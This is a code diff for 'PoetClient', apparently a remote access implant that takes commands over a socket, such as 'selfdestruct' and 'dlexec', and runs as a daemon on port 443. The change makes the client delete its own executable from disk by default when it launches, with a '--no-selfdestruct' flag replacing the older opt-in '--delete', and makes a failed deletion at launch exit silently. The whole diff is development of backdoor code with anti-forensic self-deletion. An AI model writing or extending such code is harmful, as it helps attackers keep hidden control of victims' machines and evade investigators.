@@ -78,16 +78,9 @@ class PoetClient(object):
                         s.send(e.strerror)
                 elif inp == 'selfdestruct':
                     try:
-                        # if the flag to delete client on launch wasn't given
-                        if not args.delete:
-                            os.remove(CLIENT_PATH)
-
-                        # check it's actually deleted
-                        if os.path.exists(CLIENT_PATH):
-                            raise Exception('client not deleted')
-                        else:
-                            s.send('boom')
-                            sys.exit()
+                        selfdestruct()
+                        s.send('boom')
+                        sys.exit()
                     except Exception as e:
                         s.send(str(e.message))
                 elif inp.startswith('dlexec '):
@@ -254,10 +247,10 @@ def get_args():
                         nargs='?', default=600)
     parser.add_argument('-p', '--port')
     parser.add_argument('-v', '--verbose', action="store_true")
-    parser.add_argument('-d', '--delete', action="store_true",
-                        help="delete client upon execution")
     parser.add_argument('--no-daemon', action='store_true',
                         help="don't daemonize")
+    parser.add_argument('--no-selfdestruct', action='store_true',
+                        help="don't selfdestruct")
     return parser.parse_args()
 
 
@@ -288,6 +281,14 @@ def is_active(host, port):
     except urllib2.URLError:
         pass
     return False
+
+
+def selfdestruct():
+    """Delete client executable from disk.
+    """
+
+    if os.path.exists(CLIENT_PATH):
+        os.remove(CLIENT_PATH)
 
 
 def daemonize():
@@ -322,9 +323,13 @@ def main():
     else:
         log.basicConfig(format='%(message)s')
 
-    if args.delete:
+    if not args.no_selfdestruct:
         log.info('[+] Deleting client.')
-        os.remove(CLIENT_PATH)
+        try:
+            selfdestruct()
+        except Exception as e:
+            # fatal
+            sys.exit(0)
 
     HOST = args.host
     PORT = int(args.port) if args.port else 443
